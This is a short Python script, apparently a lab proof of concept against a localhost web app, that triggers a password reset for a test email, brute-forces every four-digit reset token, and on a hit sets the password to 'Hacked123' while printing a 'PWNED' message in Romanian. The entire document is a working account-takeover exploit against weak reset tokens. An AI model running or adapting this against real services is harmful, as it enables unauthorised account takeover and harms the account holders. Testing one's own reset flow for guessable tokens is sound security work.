import requests

requests.post("http://localhost:5000/forgot_password",
              data={"email": "test@test.com"})

for token in range(1000, 10000):
    url = f"http://localhost:5000/reset_password/{token}"
    r = requests.get(url)
    if "Token invalid" not in r.text:
        print(f"[FOUND] Token valid: {token} → {url}")
        
        r2 = requests.post(url, data={"password": "Hacked123"})
        print("[PWNED] Parola a fost schimbată!")
        break
